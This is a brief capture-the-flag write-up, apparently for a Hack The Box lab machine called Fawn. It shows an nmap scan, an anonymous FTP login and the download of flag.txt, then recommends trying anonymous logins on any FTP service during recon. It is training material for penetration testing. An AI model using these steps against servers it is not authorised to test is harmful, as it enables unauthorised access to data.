# Fawn — Very Easy (Linux)

**Category:** FTP
**Summary:** Explores FTP enumeration and the risks of a misconfigured server that allows anonymous login.

## Recon
```
# nmap -sV -sC <target-ip>

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
```

## Enumeration
- Confirmed anonymous login was allowed by connecting to FTP and logging in with username `anonymous` and any password.

## Exploitation
```
#
ftp <target-ip>
Name: anonymous
Password: <anything>

ls
get flag.txt
```
finding file: ls 
copy out then flag: get flag.txt

## Flag
*Captured the flag from `flag.txt` retrieved via anonymous FTP access (not reproducing the flag value here).*

## Lessons learned
- Anonymous FTP access with zero real credentials is enough to fully browse and download files — a classic, still-common misconfiguration.
- Worth trying `anonymous`/blank-password logins on any FTP service by default during recon.